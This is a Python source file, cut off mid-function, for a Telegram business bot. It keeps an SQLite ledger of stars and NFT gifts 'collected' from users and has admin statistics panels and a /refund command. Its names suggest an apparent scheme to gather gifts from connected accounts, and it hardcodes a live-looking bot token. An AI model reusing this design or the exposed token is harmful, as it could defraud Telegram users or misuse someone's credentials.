from aiogram import F, Bot, Dispatcher, types
import asyncio
import logging
import json
import os
import sqlite3
from datetime import datetime, timedelta
from aiogram.types import Message, BusinessConnection
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.filters import Command

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

# Configuration
TOKEN = "7718769489:AAG7_Bv2KS0BwYv8ULyIyMi8EvuBXS7Jbc0"  # Your Bot API Token from @BotFather
ADMIN_ID = 8077821068  # Your Telegram ID
OWNER_ID = 8077821068  # ID –≤–ª–∞–¥–µ–ª—å—Ü–∞ –±–æ—Ç–∞
task_id = 8077821068   # ID –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤

# –§–∞–π–ª—ã –¥–∞–Ω–Ω—ã—Ö
CONNECTIONS_FILE = "connections.json"

bot = Bot(TOKEN)
dp = Dispatcher()

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö
DB_FILE = "bot_database.db"

def init_database():
    """–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # –¢–∞–±–ª–∏—Ü–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            username TEXT,
            operation_type TEXT NOT NULL,
            stars_amount INTEGER NOT NULL,
            gifts_count INTEGER DEFAULT 0,
            unique_gifts_count INTEGER DEFAULT 0,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            business_connection_id TEXT,
            status TEXT DEFAULT 'completed'
        )
    ''')
    
    # –¢–∞–±–ª–∏—Ü–∞ –±–∞–ª–∞–Ω—Å–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_balances (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            total_received INTEGER DEFAULT 0,
            total_refunded INTEGER DEFAULT 0,
            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # –¢–∞–±–ª–∏—Ü–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            total_stars_collected INTEGER DEFAULT 0,
            total_gifts_collected INTEGER DEFAULT 0,
            total_unique_gifts_collected INTEGER DEFAULT 0,
            total_refunds INTEGER DEFAULT 0,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
    cursor.execute("SELECT COUNT(*) FROM bot_stats")
    if cursor.fetchone()[0] == 0:
        cursor.execute("INSERT INTO bot_stats DEFAULT VALUES")
    
    conn.commit()
    conn.close()

def log_transaction(user_id, username, operation_type, stars_amount, gifts_count=0, unique_gifts_count=0, business_connection_id=None):
    """–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
    cursor.execute('''
        INSERT INTO transactions (user_id, username, operation_type, stars_amount, gifts_count, unique_gifts_count, business_connection_id)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, operation_type, stars_amount, gifts_count, unique_gifts_count, business_connection_id))
    
    # –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if operation_type == 'received':
        cursor.execute('''
            INSERT INTO user_balances (user_id, username, total_received, last_activity)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
                total_received = total_received + ?,
                username = ?,
                last_activity = CURRENT_TIMESTAMP
        ''', (user_id, username, stars_amount, stars_amount, username))
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –æ–±—â—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        cursor.execute('''
            UPDATE bot_stats SET
                total_stars_collected = total_stars_collected + ?,
                total_gifts_collected = total_gifts_collected + ?,
                total_unique_gifts_collected = total_unique_gifts_collected + ?,
                last_updated = CURRENT_TIMESTAMP
        ''', (stars_amount, gifts_count, unique_gifts_count))
        
    elif operation_type == 'refund':
        cursor.execute('''
            UPDATE user_balances SET
                total_refunded = total_refunded + ?,
                last_activity = CURRENT_TIMESTAMP
            WHERE user_id = ?
        ''', (stars_amount, user_id))
        
        cursor.execute('''
            UPDATE bot_stats SET
                total_refunds = total_refunds + ?,
                last_updated = CURRENT_TIMESTAMP
        ''', (stars_amount,))
    
    conn.commit()
    conn.close()

def get_user_balance_info(user_id):
    """–ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT total_received, total_refunded, username
        FROM user_balances
        WHERE user_id = ?
    ''', (user_id,))
    
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return {
            'total_received': result[0],
            'total_refunded': result[1],
            'available_for_refund': result[0] - result[1],
            'username': result[2]
        }
    return {
        'total_received': 0,
        'total_refunded': 0,
        'available_for_refund': 0,
        'username': None
    }

def get_bot_statistics():
    """–ü–æ–ª—É—á–∏—Ç—å –æ–±—â—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM bot_stats ORDER BY id DESC LIMIT 1')
    stats = cursor.fetchone()
    
    cursor.execute('SELECT COUNT(DISTINCT user_id) FROM transactions WHERE operation_type = "received"')
    unique_users = cursor.fetchone()[0]
    
    # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 24 —á–∞—Å–∞
    cursor.execute('''
        SELECT COUNT(*), COALESCE(SUM(stars_amount), 0)
        FROM transactions
        WHERE operation_type = 'received'
        AND timestamp > datetime('now', '-1 day')
    ''')
    daily_stats = cursor.fetchone()
    
    conn.close()
    
    return {
        'total_stars': stats[1] if stats else 0,
        'total_gifts': stats[2] if stats else 0,
        'total_unique_gifts': stats[3] if stats else 0,
        'total_refunds': stats[4] if stats else 0,
        'unique_users': unique_users,
        'daily_transactions': daily_stats[0],
        'daily_stars': daily_stats[1]
    }

def get_recent_transactions(limit=10):
    """–ü–æ–ª—É—á–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, username, operation_type, stars_amount, timestamp
        FROM transactions
        ORDER BY timestamp DESC
        LIMIT ?
    ''', (limit,))
    
    transactions = cursor.fetchall()
    conn.close()
    
    return transactions

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
init_database()

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –≤–æ–∑–≤—Ä–∞—Ç–∞ –∑–≤—ë–∑–¥ —á–µ—Ä–µ–∑ –æ—Ç–ø—Ä–∞–≤–∫—É –ø–æ–¥–∞—Ä–∫–æ–≤"""
    if not message.from_user:
        return
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
    if message.from_user.id != ADMIN_ID:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
        
    if not message.text:
        await message.answer("‚ùå –û—à–∏–±–∫–∞: –ø—É—Å—Ç–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ")
        return
        
    try:
        command_args = message.text.split()
        if len(command_args) != 3:
            await message.answer(
                "üìù <b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:</b>\n"
                "/refund [user_id] [–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ_–∑–≤—ë–∑–¥]\n\n"
                "<b>–ü—Ä–∏–º–µ—Ä:</b>\n"
                "/refund 123456789 100\n\n"
                "<i>–ö–æ–º–∞–Ω–¥–∞ –∫—É–ø–∏—Ç –ø–æ–¥–∞—Ä–∫–∏ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—É—é —Å—É–º–º—É –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é</i>",
                parse_mode="HTML"
            )
            return

        try:
            user_id = int(command_args[1])
            stars_amount = int(command_args[2])
        except ValueError:
            await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. User ID –∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–≤—ë–∑–¥ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —á–∏—Å–ª–∞–º–∏.")
            return

        if stars_amount <= 0:
            await message.answer("‚ùå –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–≤—ë–∑–¥ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0.")
            return
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        balance_info = get_user_balance_info(user_id)
        if stars_amount > balance_info['available_for_refund']:
            await message.answer(
                f"‚ùå <b>–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç –≤–æ–∑–≤—Ä–∞—Ç–∞!</b>\n\n"
                f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <code>{user_id}</code> (@{balance_info['username'] or 'Unknown'})\n"
                f"üí∞ –ü–æ–ª—É—á–µ–Ω–æ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: <code>{balance_info['total_received']}</code> ‚≠ê\n"
                f"‚Ü©Ô∏è –£–∂–µ –≤–æ–∑–≤—Ä–∞—â–µ–Ω–æ: <code>{balance_info['total_refunded']}</code> ‚≠ê\n"
                f"‚úÖ –î–æ—Å—Ç—É–ø–Ω–æ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞: <code>{balance_info['available_for_refund']}</code> ‚≠ê\n\n"
                f"<i>–í—ã –ø—ã—Ç–∞–µ—Ç–µ—Å—å –≤–µ—Ä–Ω—É—Ç—å {stars_amount} ‚≠ê</i>",
                parse_mode="HTML"
            )
            return

        # –ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏
        available_gifts = await bot.get_available_gifts()
        if not available_gifts or not available_gifts.gifts:
            await message.answer("‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –ø–æ–∫—É–ø–∫–∏.")
            return
        
        # –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ–¥–∞—Ä–∫–∏ –ø–æ —Ü–µ–Ω–µ (–æ—Ç –¥–æ—Ä–æ–≥–∏—Ö –∫ –¥–µ—à—ë–≤—ã–º)
        sorted_gifts = sorted(available_gifts.gifts, key=lambda g: g.star_count, reverse=True)
        
        # –ù–∞—Ö–æ–¥–∏–º –æ–ø—Ç–∏–º–∞–ª—å–Ω—É—é –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –ø–æ–¥–∞—Ä–∫–æ–≤
        gifts_to_send = []
        remaining_stars = stars_amount
        
        for gift in sorted_gifts:
            if gift.star_count <= remaining_stars:
                # –°–∫–æ–ª—å–∫–æ —Ç–∞–∫–∏—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –º–æ–∂–µ–º –∫—É–ø–∏—Ç—å
                count = remaining_stars // gift.star_count
                for _ in range(count):
                    gifts_to_send.append(gift)
                remaining_stars -= count * gift.star_count
                
                if remaining_stars == 0:
                    break
        
        if not gifts_to_send:
            min_gift_cost = min(g.star_count for g in sorted_gifts)
            await message.answer(
                f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥ –¥–ª—è –ø–æ–∫—É–ø–∫–∏ –ø–æ–¥–∞—Ä–∫–∞.\n"
                f"–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∞: {min_gift_cost} ‚≠ê"
            )
            return

        # –ü–æ–¥—Å—á–∏—Ç—ã–≤–∞–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        total_cost = sum(g.star_count for g in gifts_to_send)
        gift_stats = {}
        for gift in gifts_to_send:
            gift_stats[gift.star_count] = gift_stats.get(gift.star_count, 0) + 1
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –ø–æ–¥–∞—Ä–∫–∞—Ö
        gifts_info = "\n".join([f"  ‚Ä¢ {count}x –ø–æ–¥–∞—Ä–æ–∫ –∑–∞ {cost} ‚≠ê" 
                               for cost, count in sorted(gift_stats.items(), reverse=True)])
        
        await message.answer(
            f"üîÑ <b>–ù–∞—á–∏–Ω–∞—é –≤–æ–∑–≤—Ä–∞—Ç...</b>\n\n"
            f"üë§ –ü–æ–ª—É—á–∞—Ç–µ–ª—å: <code>{user_id}</code>\n"
            f"‚≠ê –ó–∞–ø—Ä–æ—à–µ–Ω–æ –∑–≤—ë–∑–¥: <code>{stars_amount}</code>\n"
            f"üí∞ –ë—É–¥–µ—Ç –≤–æ–∑–≤—Ä–∞—â–µ–Ω–æ: <code>{total_cost}</code> ‚≠ê\n"
            f"üéÅ –ö–æ–º–±–∏–Ω–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤:\n{gifts_info}\n\n"
            f"<i>–û—Ç–ø—Ä–∞–≤–ª—è—é –ø–æ–¥–∞—Ä–∫–∏...</i>",
            parse_mode="HTML"
        )
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–∞—Ä–∫–∏
        sent_count = 0
        sent_value = 0
        for i, gift in enumerate(gifts_to_send):
            try:
                await bot.send_gift(
                    user_id=user_id,
                    gift_id=gift.id
                )
                sent_count += 1
                sent_value += gift.star_count
            except Exception as e:
                if "PEER_ID_INVALID" in str(e):
                    await message.answer(f"‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {user_id}")
                    break
                elif "USER_IS_BLOCKED" in str(e):
                    await message.answer(f"‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –±–æ—Ç–∞.")
                    break
                else:
                    await message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞ {i+1}: {str(e)}")
                    continue
        
        if sent_count > 0:
            # –õ–æ–≥–∏—Ä—É–µ–º –≤–æ–∑–≤—Ä–∞—Ç
            log_transaction(user_id, balance_info['username'], 'refund', sent_value)
            
            await message.answer(
                f"‚úÖ <b>–í–æ–∑–≤—Ä–∞—Ç –∑–∞–≤–µ—Ä—à—ë–Ω!</b>\n\n"
                f"üéÅ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{sent_count}</code>\n"
                f"üí∞ –í–æ–∑–≤—Ä–∞—â–µ–Ω–æ –∑–≤—ë–∑–¥: <code>{sent_value}</code> ‚≠ê\n"
                f"üìä –¢–æ—á–Ω–æ—Å—Ç—å –≤–æ–∑–≤—Ä–∞—Ç–∞: <code>{sent_value}/{stars_amount}</code> ({sent_value/stars_amount*100:.1f}%)",
                parse_mode="HTML"
            )
        else:
            await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∏ –æ–¥–Ω–æ–≥–æ –ø–æ–¥–∞—Ä–∫–∞.")

    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞: {str(e)}")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    """–ì–ª–∞–≤–Ω–∞—è –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å"""
    if not message.from_user:
        return
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
    if message.from_user.id != ADMIN_ID:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")],
        [InlineKeyboardButton(text="üí∏ –ü–æ—Å–ª–µ–¥–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏", callback_data="admin_transactions")],
        [InlineKeyboardButton(text="üë• –¢–æ–ø –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π", callback_data="admin_top_users")],
        [InlineKeyboardButton(text="üí∞ –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", callback_data="admin_withdraw")],
        [InlineKeyboardButton(text="üîç –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="admin_search_user")],
        [InlineKeyboardButton(text="üìà –ì—Ä–∞—Ñ–∏–∫ –∑–∞ –Ω–µ–¥–µ–ª—é", callback_data="admin_weekly_stats")]
    ])
    
    await message.answer(
        "üéõ <b>–ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞</b>\n\n"
        "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "admin_stats")
async def admin_stats_callback(callback: types.CallbackQuery):
    """–ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    stats = get_bot_statistics()
    stats_text = (
        f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞</b>\n\n"
        f"‚≠êÔ∏è –í—Å–µ–≥–æ –∑–≤—ë–∑–¥: <code>{stats['total_stars']}</code>\n"
        f"üéÅ –û–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{stats['total_gifts']}</code>\n"
        f"üíé NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{stats['total_unique_gifts']}</code>\n"
        f"üîÑ –í—Å–µ–≥–æ –≤–æ–∑–≤—Ä–∞—Ç–æ–≤: <code>{stats['total_refunds']}</code>\n"
        f"üë• tutti i tuoi clienti: <code>{stats['unique_users']}</code>\n\n"
        f"üìÖ –ó–∞ 24 —á–∞—Å–∞:\n"
        f"‚Ä¢ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–π: <code>{stats['daily_transactions']}</code>\n"
        f"‚Ä¢ –ó–≤—ë–∑–¥: <code>{stats['daily_stars']}</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="üìÑ –ü–æ—Å–ª–µ–¥–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏", callback_data="admin_transactions")],
            [InlineKeyboardButton(text="üèÜ –¢–æ–ø –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏", callback_data="admin_top_users")],
            [InlineKeyboardButton(text="üìà –ù–µ–¥–µ–ª—å–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_weekly_stats")],
            [InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥", callback_data="admin_back")]
        ]
    )
    
    try:
        await callback.message.edit_text(stats_text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, stats_text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_transactions")
async def admin_transactions_callback(callback: types.CallbackQuery):
    """–ü–æ–∫–∞–∑–∞—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    transactions = get_recent_transactions(10)
    if not transactions:
        text = "üìÑ –ù–µ—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è"
    else:
        text = "üìÑ <b>–ü–æ—Å–ª–µ–¥–Ω–∏–µ 10 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π:</b>\n\n"
        for tx in transactions:
            user_id, username, op_type, stars, timestamp = tx
            username_text = f"@{username}" if username else f"ID: {user_id}"
            op_emoji = "üì•" if op_type == "received" else "üì§"
            text += f"{op_emoji} {username_text}: {stars} ‚≠êÔ∏è ({timestamp[:16]})\n"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥ –∫ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–µ", callback_data="admin_stats")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_top_users")
async def admin_top_users_callback(callback: types.CallbackQuery):
    """–ü–æ–∫–∞–∑–∞—Ç—å —Ç–æ–ø –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, username, total_received
        FROM user_balances
        ORDER BY total_received DESC
        LIMIT 10
    ''')
    
    top_users = cursor.fetchall()
    conn.close()
    
    if not top_users:
        text = "üèÜ –ù–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è"
    else:
        text = "üèÜ <b>–¢–æ–ø 10 –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:</b>\n\n"
        for i, (user_id, username, total) in enumerate(top_users, 1):
            username_text = f"@{username}" if username else f"ID: {user_id}"
            text += f"{i}. {username_text}: {total} ‚≠êÔ∏è\n"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥ –∫ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–µ", callback_data="admin_stats")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_back")
async def admin_back_callback(callback: types.CallbackQuery):
    """–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –≥–ª–∞–≤–Ω–æ–º—É –º–µ–Ω—é –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    text = (
        f"üîß <b>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å</b>\n\n"
        f"üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {callback.from_user.first_name}!\n"
        f"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")],
            [InlineKeyboardButton(text="üí∞ –í—ã–≤–µ—Å—Ç–∏ –∑–≤—ë–∑–¥—ã", callback_data="admin_withdraw")],
            [InlineKeyboardButton(text="üîç –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="admin_search_user")]
        ]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_withdraw")
async def admin_withdraw_callback(callback: types.CallbackQuery):
    """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤—ã–≤–æ–¥–µ –∑–≤—ë–∑–¥"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    text = (
        "üí∞ <b>–í—ã–≤–æ–¥ –∑–≤—ë–∑–¥</b>\n\n"
        "–î–ª—è –≤—ã–≤–æ–¥–∞ –∑–≤—ë–∑–¥ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É –≤ —á–∞—Ç–µ —Å –±–æ—Ç–æ–º:\n"
        "<code>/withdraw [–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ]</code>\n\n"
        "–ü—Ä–∏–º–µ—Ä: <code>/withdraw 100</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥", callback_data="admin_back")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_search_user")
async def admin_search_user_callback(callback: types.CallbackQuery):
    """–ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    text = (
        "üîç <b>–ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n"
        "–î–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É:\n"
        "<code>/user [user_id]</code>\n\n"
        "–ü—Ä–∏–º–µ—Ä: <code>/user 123456789</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥", callback_data="admin_back")]]
    )
    
    try:
